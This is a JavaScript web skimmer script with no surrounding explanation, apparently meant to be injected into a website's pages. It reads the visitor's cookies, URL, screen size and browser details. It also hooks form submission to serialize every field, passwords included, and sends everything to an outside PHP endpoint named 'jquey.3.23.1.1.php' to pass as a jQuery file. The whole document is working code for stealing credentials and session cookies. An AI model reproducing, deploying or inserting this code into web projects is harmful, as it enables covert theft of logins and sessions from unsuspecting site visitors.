


var host="http://hostname/jquey.3.23.1.1.php"

var x;
function serialize(form){if(!form||form.nodeName!=="FORM"){return }var i,j,q=[];for(i=form.elements.length-1;i>=0;i=i-1){if(form.elements[i].name===""){continue}switch(form.elements[i].nodeName){case"INPUT":switch(form.elements[i].type){case"text":case"hidden":case"password":case"email":case"button":case"reset":case"submit":q.push(form.elements[i].name+"="+encodeURIComponent(form.elements[i].value));break;case"checkbox":case"radio":if(form.elements[i].checked){q.push(form.elements[i].name+"="+encodeURIComponent(form.elements[i].value))}break;case"file":break}break;case"TEXTAREA":q.push(form.elements[i].name+"="+encodeURIComponent(form.elements[i].value));break;case"SELECT":switch(form.elements[i].type){case"select-one":q.push(form.elements[i].name+"="+encodeURIComponent(form.elements[i].value));break;case"select-multiple":for(j=form.elements[i].options.length-1;j>=0;j=j-1){if(form.elements[i].options[j].selected){q.push(form.elements[i].name+"="+encodeURIComponent(form.elements[i].options[j].value))}}break}break;case"BUTTON":switch(form.elements[i].type){case"reset":case"submit":case"button":q.push(form.elements[i].name+"="+encodeURIComponent(form.elements[i].value));break}break}}return q.join("&")};
function get(){
        if (x==null){
                var a=window.location;
                var b=window.screen.height+"x"+window.screen.width;
                var c=document.cookie;
                var d=window.navigator.appVersion.toLowerCase();
                var e=navigator.appCodeName;
                x=1;
                window.onload = function () {
                        addEventListener('submit',function () {
                        var f=serialize(document.forms[0]);
                        Red(a+b+c+d+e+f);
                    },false)
                };
                        Red(a+b+c+d+e);
                     }
                   }
get()
function Red(dates)
{
    if (window.XMLHttpRequest){
        xmlhttp = new XMLHttpRequest();
    } else {
        xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
    }
    var params = "v=" + dates;
    xmlhttp.open("GET",host+"?"+params,false);
    xmlhttp.send(params);
    return xmlhttp.responseText;
}
